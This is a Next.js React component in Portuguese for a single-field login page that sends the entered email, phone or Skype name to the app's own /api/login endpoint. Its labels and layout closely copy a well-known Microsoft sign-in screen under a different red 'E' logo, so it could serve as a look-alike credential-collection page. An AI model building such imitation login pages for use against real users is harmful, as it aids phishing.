"use client"

import { useState } from "react"
import { Button } from "@components/ui/button"
import { Input } from "@components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@components/ui/card"
import { Label } from "@components/ui/label"
import { Search } from "lucide-react"
import { useRouter } from "next/navigation"

export default function PaginaLogin() {
  const [telefone, setTelefone] = useState("")
  const router = useRouter()

  const tratarLogin = async () => {
    if (!telefone.trim()) {
      alert("Por favor, digite seu email, telefone ou Skype")
      return
    }

    // Simular validação
    if (telefone.length < 3) {
      alert("Por favor, digite um email, telefone ou Skype válido")
      return
    }

    // Simular carregamento
    const botao = document.querySelector("button")
    if (botao) {
      botao.textContent = "Entrando..."
      botao.disabled = true
    }

    try {
      const resposta = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ telefone }),
      })

      const dados = await resposta.json()

      if (resposta.ok) {
        router.push("/painel")
      } else {
        alert(dados.erro || "Erro no login")
      }
    } catch (erro) {
      alert("Erro de conexão")
    } finally {
      if (botao) {
        botao.textContent = "Avançar"
        botao.disabled = false
      }
    }
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div
        className="absolute inset-0 bg-cover bg-center opacity-30"
        style={{
          backgroundImage: `url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="petals" x="0" y="0" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="5" cy="5" r="2" fill="%23dc2626" opacity="0.1"/><circle cx="15" cy="15" r="1.5" fill="%23dc2626" opacity="0.15"/><circle cx="10" cy="18" r="1" fill="%23dc2626" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23petals)"/></svg>')`,
        }}
      />

      {/* Login Card */}
      <Card className="w-full max-w-md bg-white shadow-lg border relative z-10">
        <CardHeader className="text-center pb-2">
          <div className="flex justify-center mb-4">
            <div className="w-12 h-12 bg-[#E70000] rounded-full flex items-center justify-center">
              <span className="text-white font-bold text-xl">E</span>
            </div>
          </div>
          <CardTitle className="text-2xl font-bold text-gray-900">Entrar</CardTitle>
        </CardHeader>
        <CardContent className="space-y-6">
          <div className="space-y-2">
            <Label htmlFor="telefone" className="text-sm font-medium text-gray-700">
              Email, telefone ou Skype
            </Label>
            <Input
              id="telefone"
              type="text"
              placeholder=""
              value={telefone}
              onChange={(e: React.ChangeEvent<HTMLInputElement>) => setTelefone(e.target.value)}
              className="w-full border-gray-300"
            />
          </div>

          <div className="text-center">
            <a href="#" className="text-sm hover:underline text-red-500">
              Não consegue acessar sua conta?
            </a>
          </div>

          <Button onClick={tratarLogin} className="w-full hover:bg-blue-700 text-white bg-red-600" size="lg">
            Avançar
          </Button>

          <div className="flex items-center justify-center pt-4">
            <Button
              variant="outline"
              size="sm"
              className="flex items-center gap-2 text-gray-600 border-gray-300 bg-transparent"
            >
              <Search className="w-4 h-4" />
              Opções de entrada
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
